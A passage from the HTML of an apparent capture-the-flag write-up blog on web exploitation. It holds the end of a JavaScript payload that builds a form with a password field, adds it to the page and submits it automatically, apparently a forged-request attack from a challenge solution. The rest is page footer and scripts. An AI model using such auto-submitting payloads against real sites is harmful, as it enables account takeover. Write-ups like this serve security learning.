+</span></span><span class=line><span class=cl><span class=nx>passwordInput</span><span class=p>.</span><span class=nx>name</span> <span class=o>=</span> <span class=s1>&#39;password&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>passwordInput</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>password</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>form</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>passwordInput</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>submit</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>submit</span><span class=p>.</span><span class=nx>type</span> <span class=o>=</span> <span class=s1>&#39;submit&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>form</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>submit</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>//Add to the document
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>form</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>//Submit
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>submit</span><span class=p>.</span><span class=nx>click</span><span class=p>();</span>
+</span></span></code></pre></div></section><footer class=article-footer><section class=article-tags><a href=/tags/web-exploitation/>Web Exploitation</a>
+<a href=/tags/wakeful-cloud/>Wakeful Cloud</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-contents--wrapper><h2 class=section-title>Related contents</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/post/x-marks-the-spot/><div class=article-details><h2 class=article-title>X Marks the Spot</h2></div></a></article><article><a href=/post/web-gauntlet-3/><div class=article-details><h2 class=article-title>Web Gauntlet 3</h2></div></a></article><article><a href=/post/web-gauntlet-2/><div class=article-details><h2 class=article-title>Web Gauntlet 2</h2></div></a></article><article><a href=/post/get-ahead/><div class=article-details><h2 class=article-title>Get Ahead</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2022 BMHS TSA</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=2.3.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=/ts/main.js defer></script>
+<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
